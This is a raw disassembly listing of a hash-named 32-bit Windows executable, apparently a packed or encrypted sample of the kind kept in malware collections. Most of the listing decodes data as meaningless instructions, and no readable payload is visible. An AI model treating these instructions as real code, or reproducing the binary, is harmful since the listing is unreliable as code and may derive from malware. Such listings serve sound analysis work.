
6db28e93abb5933ea40a7ec713e637d816324747dda3a5de10e906d061c64f9a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xb1343908,cl
  401025:	lds    edi,FWORD PTR [esi+0x7e]
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    eax,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    eax,ebp
  40103c:	add    BYTE PTR [edi],cl
  40103e:	xor    ecx,DWORD PTR [edi]
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0xf426b5a5
  4010d8:	mov    dl,0xc7
  4010da:	xor    cl,ah
  4010dc:	cwd    
  4010de:	jg     0x4010c8
  4010e0:	pusha  
  4010e1:	pop    esi
  4010e2:	sbb    ah,cl
  4010e4:	mov    esi,0x900e95db
  4010e9:	rol    DWORD PTR [edi],1
  4010eb:	aad    0xf8
  4010ed:	lods   al,BYTE PTR ds:[esi]
  4010ee:	pop    ss
  4010ef:	out    0xca,eax
  4010f1:	cmc    
  4010f2:	test   cl,dl
  4010f4:	dec    esi
  4010f5:	and    al,0xa5
  4010f7:	push   ds
  4010f8:	ret    
  4010f9:	cmp    al,0x62
  4010fb:	scas   al,BYTE PTR es:[edi]
  4010fc:	lods   al,BYTE PTR ds:[esi]
  4010fd:	div    BYTE PTR [eax]
  4010ff:	popa   
  401100:	outs   dx,BYTE PTR ds:[esi]
  401101:	cwde   
  401102:	push   edx
  401103:	lock jecxz 0x40112c
  401106:	push   cs
  401107:	sub    edx,DWORD PTR [edx+0x6e]
  40110a:	lods   al,BYTE PTR ds:[esi]
  40110b:	fisub  WORD PTR [ebx]
  40110d:	mov    dh,ah
  40110f:	fwait
  401110:	jmp    0x97e8:0xf8a6e82c
  401117:	scas   eax,DWORD PTR es:[edi]
  401118:	aaa    
  401119:	stos   BYTE PTR es:[edi],al
  40111a:	or     ebp,esp
  40111c:	out    dx,eax
  40111d:	clc    
  40111e:	push   ebx
  40111f:	and    DWORD PTR [esi-0x66c12bc7],0xffffffc2
  401126:	mov    cl,0x39
  401128:	popa   
  401129:	xchg   ecx,eax
  40112a:	sti    
  40112b:	push   ebx
  40112c:	stc    
  40112d:	(bad)  
  40112e:	mov    eax,0xa0409f01
  401133:	popa   
  401134:	fmul   st(6),st
  401136:	jl     0x401114
  401138:	push   edx
  401139:	and    BYTE PTR [ecx+ebx*2+0x312daa46],ch
  401140:	aas    
  401141:	out    0x96,al
  401143:	dec    edx
  401144:	xor    al,0x37
  401146:	es mov dh,ah
  401149:	sbb    al,0x7a
  40114b:	pop    ss
  40114c:	jae    0x4010d5
  40114e:	cmp    BYTE PTR ds:0xe7f7e142,0xb2
  401155:	jmp    0xf34d44be
  40115a:	mov    esi,0x4e4e754c
  40115f:	in     al,dx
  401160:	adc    ebx,DWORD PTR [ebp-0x70a077b8]
  401166:	xchg   esi,eax
  401167:	inc    ecx
  401168:	dec    ebp
  401169:	dec    edx
  40116a:	or     eax,esp
  40116c:	(bad)  
  40116e:	mov    WORD PTR [ecx],gs
  401170:	xchg   ebp,eax
  401171:	jg     0x40115d
  401173:	pop    esp
  401174:	mov    cl,0x4d
  401176:	scas   al,BYTE PTR es:[edi]
  401177:	jmp    0xe437:0x46955fd7
  40117e:	cwde   
  40117f:	push   ds
  401180:	add    BYTE PTR [eax+0x7],bh
  401183:	aaa    
  401184:	or     al,0x47
  401186:	dec    ebx
  401187:	ret    0x9bb1
  40118a:	stc    
  40118b:	das    
  40118c:	aas    
  40118d:	lds    edi,FWORD PTR ds:0x3ad77139
  401193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401194:	cmc    
  401195:	push   ds
  401196:	sbb    al,0xfc
  401198:	inc    edx
  401199:	sbb    dl,cl
  40119b:	push   esi
  40119c:	pop    eax
  40119d:	sbb    al,0xfd
  40119f:	push   edx
  4011a0:	pushf  
  4011a1:	sbb    eax,0x57661c6f
  4011a6:	push   0x69d6851
  4011ab:	or     BYTE PTR [edx+0x24],ah
  4011ae:	dec    edi
  4011af:	out    dx,al
  4011b0:	loope  0x401142
  4011b2:	std    
  4011b3:	mov    bl,0xa7
  4011b5:	imul   esp,esi,0xffffff84
  4011b8:	dec    edi
  4011b9:	lods   al,BYTE PTR ds:[esi]
  4011ba:	daa    
  4011bb:	add    ebx,DWORD PTR [edi]
  4011bd:	push   0xa68655ca
  4011c2:	jno    0x4011ea
  4011c4:	loope  0x40123d
  4011c6:	or     dh,bl
  4011c8:	jnp    0x401171
  4011ca:	mov    ecx,0xc8c5f4a3
  4011cf:	inc    ebp
  4011d0:	stos   DWORD PTR es:[edi],eax
  4011d1:	cmp    al,0x4f
  4011d3:	mov    ds:0x48e4f6d9,al
  4011d8:	xor    BYTE PTR [ebx-0x52d72d1],ah
  4011de:	aad    0xfd
  4011e0:	mov    cl,0x16
  4011e2:	pusha  
  4011e3:	pop    ebx
  4011e4:	rcl    BYTE PTR [eax-0x427b8245],1
  4011ea:	pop    es
  4011eb:	jecxz  0x401203
  4011ed:	add    ebp,DWORD PTR [ecx]
  4011ef:	cmp    esp,DWORD PTR [esi]
  4011f1:	mov    esi,0x1993b23d
  4011f6:	cpuid  
  4011f8:	(bad)  
  4011f9:	enter  0x7a68,0xd8
  4011fd:	cdq    
  4011fe:	(bad)  
  4011ff:	cmp    ebx,DWORD PTR [esi+eiz*4+0x21f1953]
  401206:	(bad)  
  401207:	test   al,0x4e
  401209:	repnz pushf 
  40120b:	pop    eax
  40120c:	repz xchg edx,eax
  40120e:	push   DWORD PTR [ebp-0x4b]
  401211:	ficom  DWORD PTR [ecx]
  401213:	adc    eax,0x2cf5219d
  401218:	inc    edx
  401219:	fiadd  DWORD PTR [edi+0x6e144cd1]
  40121f:	imul   esi,DWORD PTR [esi+0x3c0f517b],0x434177a3
  401229:	push   esp
  40122a:	(bad)  
  40122b:	or     al,0xd7
  40122d:	cld    
  40122e:	jp     0x4011d9
  401230:	xchg   ebx,eax
  401231:	mov    esp,DWORD PTR [esi+0x9]
  401234:	or     edi,DWORD PTR [eax-0x4c5be836]
  40123a:	mov    WORD PTR ds:0xfe6ad0c6,ss
  401240:	cs push ebp
  401242:	inc    esi
  401243:	inc    si
  401245:	arpl   WORD PTR [esi+0x27],bx
  401248:	jbe    0x4011fa
  40124a:	mov    al,ds:0xe4df623b
  40124f:	ds repz add al,0xba
  401253:	aad    0x72
  401255:	pushf  
  401256:	out    dx,al
  401257:	aam    0x98
  401259:	push   edx
  40125a:	push   0xffffff8e
  40125c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40125d:	(bad)  
  40125e:	xor    eax,0xa89e3c6b
  401263:	(bad)
  401266:	xchg   ebp,eax
  401267:	sub    DWORD PTR [ebp-0x72],ebp
  40126a:	add    al,0xa8
  40126c:	ins    BYTE PTR es:[edi],dx
  40126d:	xchg   edx,eax
  40126e:	add    BYTE PTR gs:[edi],dl
  401271:	jl     0x401265
  401273:	jp     0x4011f6
  401275:	inc    ebx
  401276:	adc    edx,ebx
  401278:	jecxz  0x401288
  40127a:	mov    edx,0x60d366b0
  40127f:	repz out 0x45,al
  401282:	and    edi,DWORD PTR [esi+0x3e4fa55]
  401288:	aas    
  401289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40128a:	mov    dh,0x8a
  40128c:	push   ds
  40128d:	addr16 add eax,0x8d53b250
  401293:	scas   eax,DWORD PTR es:[edi]
  401294:	clc    
  401295:	adc    eax,0xd9b046ae
  40129a:	fs mov cl,0xa6
  40129d:	mov    esp,0x8c8720f4
  4012a2:	add    eax,0x53d9f058
  4012a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012a8:	fcom   QWORD PTR [edx]
  4012aa:	fwait
  4012ab:	stc    
  4012ac:	int3   
  4012ad:	pop    esi
  4012ae:	int    0x9
  4012b0:	jle    0x4012d3
  4012b2:	cmp    BYTE PTR [ebx+0x78],cl
  4012b5:	dec    edx
  4012b6:	scas   al,BYTE PTR es:[edi]
  4012b7:	in     al,dx
  4012b8:	sub    edi,DWORD PTR [edx-0x6cc1f84b]
  4012be:	shl    DWORD PTR [esi-0x65a4f6c9],0xf5
  4012c5:	add    ah,BYTE PTR [eax+0x9f3fb10]
  4012cb:	or     eax,DWORD PTR [ecx-0x54ee02ef]
  4012d1:	sub    eax,0x80459ee9
  4012d6:	xor    DWORD PTR [edi],edx
  4012d8:	jle    0x40125e
  4012da:	mov    ch,0xb1
  4012dc:	xor    BYTE PTR [esi],bh
  4012de:	loope  0x40131f
  4012e0:	out    0xd4,al
  4012e2:	sbb    DWORD PTR [ebx-0x71],esi
  4012e5:	xchg   ebp,eax
  4012e6:	add    DWORD PTR [ecx+0x2c],0xffffffe7
  4012ea:	rcl    esi,1
  4012ec:	adc    eax,0x662e4620
  4012f1:	loop   0x401372
  4012f3:	fimul  DWORD PTR [ebx+0x76]
  4012f6:	sbb    ebp,edx
  4012f8:	and    al,0xd9
  4012fa:	das    
  4012fb:	xor    BYTE PTR [eax+0x78ca00b4],ah
  401301:	xchg   edx,eax
  401302:	in     eax,dx
  401303:	adc    ecx,edx
  401305:	sub    al,0xc5
  401307:	mov    ah,0x70
  401309:	call   0xa7bb:0xc400ac12
  401310:	pop    ecx
  401311:	or     eax,0xbdd99000
  401316:	mov    BYTE PTR [edx+0x47],ch
  401319:	sub    al,BYTE PTR [ebx+ebp*4]
  40131c:	pop    ebp
  40131d:	(bad)  
  40131e:	xchg   ebx,eax
  40131f:	ret    
  401320:	xor    al,0x6b
  401322:	rcr    BYTE PTR [ecx],1
  401324:	inc    eax
  401325:	jp     0x4012ac
  401327:	jo     0x401370
  401329:	mov    cs,WORD PTR [esi-0x33645ac8]
  40132f:	sbb    eax,DWORD PTR [eax+0x3d]
  401332:	popa   
  401333:	fsub   DWORD PTR [edi+0x7d]
  401336:	(bad)  
  401338:	add    eax,0x1891d274
  40133d:	imul   ecx,DWORD PTR [esp+eax*8],0xffffff8b
  401341:	jecxz  0x4012f7
  401343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401344:	nop
  401345:	mov    ds:0xa3fda43c,al
  40134a:	lea    ebp,[di]
  40134d:	loop   0x4013b6
  40134f:	adc    al,0xe4
  401351:	pop    ebp
  401352:	inc    esi
  401353:	scas   al,BYTE PTR es:[edi]
  401354:	dec    edx
  401355:	add    al,0x26
  401357:	daa    
  401358:	mov    eax,0x21aba154
  40135d:	mov    BYTE PTR [edx-0x66332cd1],0xfd
  401364:	jb     0x4013b6
  401366:	dec    esp
  401367:	retf   
  401368:	mov    dh,dh
  40136a:	xor    al,bh
  40136c:	and    eax,0xd7dc9bb4
  401371:	push   edi
  401372:	test   al,0x27
  401374:	dec    esp
  401375:	xor    BYTE PTR [esi*2+0x2ecb49a8],cl
  40137c:	out    dx,al
  40137d:	nop
  40137e:	jb     0x401341
  401380:	sbb    ecx,DWORD PTR [edx+0x7a]
  401383:	cmp    dl,BYTE PTR [edx+0x57]
  401386:	cld    
  401387:	jmp    ebx
  401389:	xchg   esp,eax
  40138a:	lock ret 0xd00a
  40138e:	ror    DWORD PTR [edx],cl
  401390:	aaa    
  401391:	xchg   ebx,eax
  401392:	dec    ecx
  401393:	xchg   esp,eax
  401394:	in     eax,0x2f
  401396:	jp     0x401410
  401398:	ds pop esi
  40139a:	lods   eax,DWORD PTR ds:[esi]
  40139b:	adc    DWORD PTR [edx],edi
  40139d:	loope  0x40132d
  40139f:	imul   ebp,ebp,0x7bf01b40
  4013a5:	push   esi
  4013a6:	(bad)  
  4013a7:	mov    dl,0x2
  4013a9:	adc    DWORD PTR [ebp+0x31],esi
  4013ac:	xlat   BYTE PTR ds:[ebx]
  4013ad:	and    DWORD PTR fs:[edi-0x277d88e1],esi
  4013b4:	test   eax,0x6505bff3
  4013b9:	loop   0x401434
  4013bb:	cmc    
  4013bc:	add    ah,BYTE PTR [edx]
  4013be:	loop   0x4013b1
  4013c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013c1:	ja     0x401353
  4013c3:	or     ah,dh
  4013c5:	pop    edi
  4013c6:	out    dx,al
  4013c7:	push   esi
  4013c8:	and    cl,ah
  4013ca:	pop    esi
  4013cb:	pop    edi
  4013cc:	clc    
  4013cd:	jge    0x401418
  4013cf:	mov    ebp,0x66f48c19
  4013d4:	xchg   DWORD PTR [edi+0x58],eax
  4013d7:	mov    ch,0x68
  4013d9:	les    ecx,FWORD PTR [edx]
  4013db:	in     eax,0x74
  4013dd:	sub    eax,0x74624401
  4013e2:	test   DWORD PTR [esi],edx
  4013e4:	and    BYTE PTR ds:0xba177d49,ah
  4013ea:	das    
  4013eb:	sbb    edx,DWORD PTR [ecx+0x423a93d1]
  4013f1:	mov    al,BYTE PTR [edi+0x0]
  4013f4:	mov    dh,0xb3
  4013f6:	pop    ecx
  4013f7:	les    edx,FWORD PTR ds:0xd90d991e
  4013fd:	mov    eax,0x727889d4
  401402:	jnp    0x40138e
  401404:	xchg   ebx,eax
  401405:	es add eax,0x6896566
  40140b:	adc    eax,0x41981f35
  401410:	mov    bl,0x1b
  401412:	ffree  st(5)
  401414:	(bad)  
  401415:	ins    DWORD PTR es:[edi],dx
  401416:	jge    0x40139b
  401418:	mov    esp,0xf69aea26
  40141d:	test   BYTE PTR [esi],dh
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    eax,DWORD PTR [ebx]
  4014c2:	mov    dh,0x35
  4014c4:	xor    DWORD PTR [edi+0x7d],ebp
  4014c7:	jle    0x401547
  4014c9:	outs   dx,DWORD PTR ds:[esi]
  4014ca:	jge    0x40154a
  4014cc:	jle    0x40152a
  4014ce:	cmp    DWORD PTR [edx-0x503b04f5],eax
  4014d4:	shr    esp,0x26
  4014d7:	adc    al,0x62
  4014d9:	(bad)  
  4014da:	ins    DWORD PTR es:[edi],dx
  4014db:	neg    bl
  4014dd:	mov    ah,0x14
  4014df:	loope  0x4014ac
  4014e1:	sbb    esi,ebx
  4014e3:	(bad)  [esi+esi*1-0xc]
  4014e7:	sub    cl,BYTE PTR [ebx+0x6689e351]
  4014ed:	std    
  4014ee:	aas    
  4014ef:	xor    eax,0xb049cc4c
  4014f4:	dec    edx
  4014f5:	loopne 0x4014d5
  4014f7:	adc    DWORD PTR [edi+0x5a57b54d],eax
  4014fd:	push   cs
  4014fe:	lods   eax,DWORD PTR ds:[esi]
  4014ff:	and    bh,dh
  401501:	bound  ebx,QWORD PTR [ecx+0x55]
  401504:	mov    ah,0x5c
  401506:	stos   DWORD PTR es:[edi],eax
  401507:	sahf   
  401508:	and    al,0xf0
  40150a:	push   ds
  40150b:	pop    ss
  40150c:	repz js 0x4014a4
  40150f:	mov    BYTE PTR [ecx-0x20f0be3f],al
  401515:	sbb    eax,0x9d3f5189
  40151a:	popa   
  40151b:	adc    DWORD PTR [ecx+0x40],eax
  40151e:	add    al,0x66
  401520:	or     eax,0x12682a74
  401525:	mov    ?,WORD PTR [ebp+0x5c]
  401528:	push   ecx
  401529:	daa    
  40152a:	leave  
  40152b:	add    DWORD PTR [ebx-0x32],edx
  40152e:	fiadd  DWORD PTR [esi-0x35]
  401531:	lahf   
  401532:	call   0x38ef844e
  401537:	mov    ebx,0x333ea652
  40153c:	mov    dl,0x5
  40153e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40153f:	sub    edi,DWORD PTR [edi+0x66bca693]
  401545:	sbb    DWORD PTR [ebx],eax
  401547:	sahf   
  401548:	leave  
  401549:	test   eax,0x69fbcd8e
  40154e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40154f:	cdq    
  401550:	rol    BYTE PTR [edx+0x36],cl
  401553:	stos   BYTE PTR es:[edi],al
  401554:	scas   al,BYTE PTR es:[edi]
  401555:	mov    cl,0xbb
  401557:	xchg   esi,eax
  401558:	mov    dh,0xa2
  40155a:	sbb    edi,DWORD PTR [ebx+ebp*4-0x35]
  40155e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40155f:	retf   
  401560:	jmp    0x40157d
  401562:	mov    ebp,0xac40f416
  401567:	mov    ecx,0x1e975b30
  40156c:	mov    ecx,0x6e8fabf4
  401571:	pop    edx
  401572:	shr    BYTE PTR [eax],1
  401574:	std    
  401575:	bound  edi,QWORD PTR [ebx+eax*1-0x6077855f]
  40157c:	nop
  40157d:	je     0x40154a
  40157f:	cmp    dl,dl
  401581:	pop    ds
  401582:	jo     0x401535
  401584:	and    dh,BYTE PTR [eax+0x62f8e088]
  40158a:	push   ecx
  40158b:	jg     0x401519
  40158d:	test   DWORD PTR [edx+0x3d],esi
  401590:	lods   al,BYTE PTR ds:[esi]
  401591:	jmp    0x4015e6
  401593:	push   ebx
  401594:	jbe    0x40156c
  401596:	lahf   
  401597:	fadd   DWORD PTR [edx]
  401599:	mov    edi,DWORD PTR [edx+0x657edee7]
  40159f:	not    DWORD PTR [ecx+0x65132053]
  4015a5:	(bad)  
  4015a6:	test   al,0x74
  4015a8:	test   al,0xd1
  4015aa:	inc    ecx
  4015ab:	loop   0x4015b1
  4015ad:	cmp    bh,BYTE PTR ds:0x6d38ffe0
  4015b3:	arpl   WORD PTR [esp+eiz*8],ax
  4015b6:	popf   
  4015b7:	push   ecx
  4015b8:	xor    al,0xb1
  4015ba:	pop    esi
  4015bb:	in     eax,dx
  4015bc:	dec    edi
  4015bd:	cmp    eax,0xf4548e77
  4015c2:	lea    esi,[ebx+0xc92571c]
  4015c8:	pop    esp
  4015c9:	test   BYTE PTR [eax],dh
  4015cb:	cli    
  4015cc:	mov    cl,0xbc
  4015ce:	push   0x6a
  4015d0:	(bad)  
  4015d1:	mov    ebp,0x9592d0b5
  4015d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015d7:	and    ebp,DWORD PTR [eax+edx*1+0x28]
  4015db:	sub    DWORD PTR [ecx-0x61],0x93bc4d16
  4015e2:	(bad)  
  4015e3:	pusha  
  4015e4:	out    dx,eax
  4015e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015e6:	and    DWORD PTR ds:0xa5d9bd32,0xffffff80
  4015ed:	and    BYTE PTR [ebx-0x1b],0xef
  4015f1:	dec    edx
  4015f2:	or     al,0xa9
  4015f4:	dec    eax
  4015f5:	rol    BYTE PTR [ecx+0x5d],1
  4015f8:	pusha  
  4015f9:	jns    0x4015dc
  4015fb:	xor    al,0xcc
  4015fd:	leave  
  4015fe:	adc    WORD PTR [edx-0x5caab2d0],bp
  401605:	sub    BYTE PTR [edx+0x77f4c73a],bh
  40160b:	scas   al,BYTE PTR es:[edi]
  40160c:	or     edi,DWORD PTR [eax+0x27]
  40160f:	aas    
  401610:	push   ebx
  401611:	ret    
  401612:	jne    0x4015da
  401614:	clc    
  401615:	leave  
  401616:	das    
  401617:	aam    0x12
  401619:	push   ebp
  40161a:	(bad)  [ebx]
  40161c:	jnp    0x40166f
  40161e:	sahf   
  40161f:	push   ecx
  401620:	popa   
  401621:	(bad)  
  401622:	aad    0x18
  401624:	adc    DWORD PTR [esi-0x19],ebx
  401627:	xchg   ecx,eax
  401628:	ficom  WORD PTR [ebp+0x1d]
  40162b:	adc    al,0x48
  40162d:	push   edx
  40162e:	add    eax,0x5f9c973e
  401633:	cmp    dl,dl
  401635:	fstp   QWORD PTR [ebx]
  401637:	mov    bh,0x4f
  401639:	or     eax,0x292fa956
  40163e:	adc    al,0x93
  401640:	mov    bl,0xaf
  401642:	jb     0x401672
  401644:	inc    ebx
  401645:	push   esp
  401646:	stc    
  401647:	out    0x27,eax
  401649:	cmp    ebp,ebx
  40164b:	push   ebp
  40164c:	shr    BYTE PTR [esi],cl
  40164e:	push   esi
  40164f:	xor    BYTE PTR [esi-0x60],bh
  401652:	lods   al,BYTE PTR ds:[esi]
  401653:	sti    
  401654:	fimul  WORD PTR [eax]
  401656:	xchg   ebp,eax
  401657:	xor    esi,ebp
  401659:	stos   DWORD PTR es:[edi],eax
  40165a:	add    DWORD PTR [edi+0x7162d52f],0x1
  401661:	inc    edx
  401662:	xchg   BYTE PTR [ebx+0x6de86726],bh
  401668:	aaa    
  401669:	dec    esi
  40166a:	fwait
  40166b:	xor    BYTE PTR ds:0x58406efe,dl
  401671:	mov    ecx,0x37129c04
  401676:	clc    
  401677:	lds    eax,FWORD PTR [ecx+eiz*2-0xa271b5]
  40167e:	jnp    0x401651
  401680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401681:	xchg   esp,eax
  401682:	mov    al,ds:0x2db3a453
  401687:	ss loope 0x4016dd
  40168a:	push   ecx
  40168b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40168c:	push   edx
  40168d:	add    DWORD PTR [ebp-0x55ec47bb],esi
  401693:	fadd   QWORD PTR [edi]
  401695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401696:	xor    bl,BYTE PTR [ebx]
  401698:	add    DWORD PTR [esi+0x29a94ee8],eax
  40169e:	jecxz  0x4016f2
  4016a0:	pusha  
  4016a1:	sbb    DWORD PTR [eax+0x54],ebx
  4016a4:	mov    ah,BYTE PTR ds:0x245e0c23
  4016aa:	inc    ebx
  4016ab:	in     eax,0xa3
  4016ad:	int3   
  4016ae:	rcl    BYTE PTR [ebp+0x405b1923],0xf
  4016b5:	cli    
  4016b6:	adc    bh,BYTE PTR [ebx]
  4016b8:	and    DWORD PTR [eax-0x128ae28f],esi
  4016be:	out    0xf3,eax
  4016c0:	jnp    0x4016a9
  4016c2:	jae    0x40169a
  4016c4:	stos   DWORD PTR es:[edi],eax
  4016c5:	or     DWORD PTR [edx],0x2c0d5d7f
  4016cb:	in     eax,dx
  4016cc:	call   0xcdec:0x920b4778
  4016d3:	push   edx
  4016d4:	out    dx,eax
  4016d5:	ficom  DWORD PTR [esi-0x7b]
  4016d8:	ret    
  4016d9:	sub    BYTE PTR [ebx],dl
  4016db:	inc    edx
  4016dc:	dec    edi
  4016dd:	je     0x4016a3
  4016df:	mov    BYTE PTR ss:[eax-0x30a938f5],bl
  4016e6:	out    dx,eax
  4016e7:	ins    BYTE PTR es:[edi],dx
  4016e8:	test   DWORD PTR gs:[edi-0x71],0x193927d4
  4016f0:	call   FWORD PTR [edx-0x1a]
  4016f3:	mov    ecx,0x87a96df8
  4016f8:	cwde   
  4016f9:	daa    
  4016fa:	inc    ecx
  4016fb:	fimul  WORD PTR ds:0x1b779b69
  401701:	jge    0x4016c5
  401703:	ja     0x401713
  401705:	pop    ss
  401706:	push   ebp
  401707:	or     eax,0xb4b59346
  40170c:	mov    cl,0x10
  40170e:	stc    
  40170f:	cld    
  401710:	fbstp  TBYTE PTR [ecx]
  401713:	(bad)  
  401714:	sti    
  401715:	loope  0x40170b
  401717:	add    BYTE PTR [edx],0xe1
  40171a:	pop    ebx
  40171b:	in     eax,dx
  40171c:	repz imul edx,edi,0xffffffbb
  401720:	les    ebx,FWORD PTR [ebp+0x57e8b13]
  401726:	and    ah,BYTE PTR [edx+0x61]
  401729:	out    dx,eax
  40172a:	rol    BYTE PTR [edx+0x2c8243f1],cl
  401730:	lea    edi,[eax+0x16ee857c]
  401736:	in     al,0x88
  401738:	(bad)  
  401739:	mov    eax,0xff078b67
  40173e:	mov    DWORD PTR [ebx-0x9e1409e],esi
  401744:	sub    ch,BYTE PTR [esi+0x43b3524b]
  40174a:	mov    ebx,esi
  40174c:	fild   QWORD PTR [edx+esi*4-0x741fd48e]
  401753:	in     al,0x4c
  401755:	push   ds
  401756:	stc    
  401757:	ret    
  401758:	dec    eax
  401759:	or     BYTE PTR [esi],dl
  40175b:	pop    esp
  40175c:	int3   
  40175d:	xchg   edx,eax
  40175e:	and    bh,ch
  401760:	mov    ebx,0xb2cf40cc
  401765:	sub    bh,dl
  401767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401768:	cmc    
  401769:	pop    ss
  40176a:	dec    esi
  40176b:	pop    ecx
  40176c:	ja     0x40173d
  40176e:	adc    DWORD PTR ss:[edi],edx
  401771:	sti    
  401772:	or     ah,BYTE PTR [ebp+eax*4-0x52984f21]
  401779:	add    bh,BYTE PTR [ebp+0x3]
  40177c:	push   cs
  40177d:	leave  
  40177e:	jbe    0x401748
  401780:	cmp    BYTE PTR [eax-0x25185f30],ch
  401786:	add    DWORD PTR [eax],esi
  401788:	inc    ebp
  401789:	addr16 mov esp,0xdc635526
  40178f:	push   ds
  401790:	loope  0x401781
  401792:	push   esi
  401793:	pop    edx
  401794:	jmp    0x401786
  401796:	lods   eax,DWORD PTR ds:[esi]
  401797:	pop    ss
  401798:	ret    0xc1c6
  40179b:	in     eax,0x11
  40179d:	test   eax,ebp
  40179f:	jae    0x401802
  4017a1:	inc    ecx
  4017a2:	cmp    DWORD PTR [ebx],esp
  4017a4:	in     eax,dx
  4017a5:	mov    ebp,0x3b94244a
  4017aa:	add    BYTE PTR [edx],bl
  4017ac:	xor    bh,BYTE PTR [edx-0xcea2407]
  4017b2:	mov    ah,0x8d
  4017b4:	lods   al,BYTE PTR ds:[esi]
  4017b5:	std    
  4017b6:	scas   al,BYTE PTR es:[edi]
  4017b7:	mov    dl,0x97
  4017b9:	popf   
  4017ba:	lods   al,BYTE PTR ds:[esi]
  4017bb:	pop    ds
  4017bc:	loopne 0x401771
  4017be:	ds (bad) 
  4017c0:	mov    BYTE PTR [ecx+0x4a],bl
  4017c3:	inc    esi
  4017c4:	int    0xb9
  4017c6:	xor    al,bl
  4017c8:	push   eax
  4017c9:	dec    ebp
  4017ca:	cmp    BYTE PTR [ebx],0x64
  4017cd:	sbb    cl,ah
